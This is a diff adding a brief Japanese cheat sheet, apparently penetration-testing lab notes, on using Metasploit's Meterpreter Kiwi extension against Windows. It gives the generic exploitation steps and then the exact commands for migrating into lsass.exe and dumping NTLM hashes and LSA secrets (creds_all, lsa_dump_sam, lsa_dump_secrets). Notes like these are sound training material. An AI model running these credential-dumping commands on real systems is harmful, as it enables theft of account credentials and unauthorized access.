@@ -1,0 +1,19 @@
+Windows：Meterpreter：Kiwi拡張機能
+1) 攻撃者マシンとターゲットマシンを起動する。
+2) pingでターゲットマシンが起動しているかを確認する
+3) nmapでセキュリティーホールを探索する
+4) searchsploit サービス名でローカルにexploitが存在するか確認する
+5) service postgresql start && msfconsoleを起動する
+6) use でモジュールを起動する
+7) set で基本情報を設定する
+8) exploitでmeterpreterを奪取する。
+9) 現在のプロセスをlsass.exeに移行する
+migrate -N lsass.exe
+10) Kiwi拡張機能をロードする
+load kiwi
+11) Kiwi拡張コマンドを使用して、管理者のNTLMハッシュをダンプする
+creds_all
+12) Kiwiを使用して、すべてのユーザーのNTLMハッシュを抽出する
+lsa_dump_sam
+13) LSAシークレットをダンプしてsyskeyを見つける
+lsa_dump_secrets
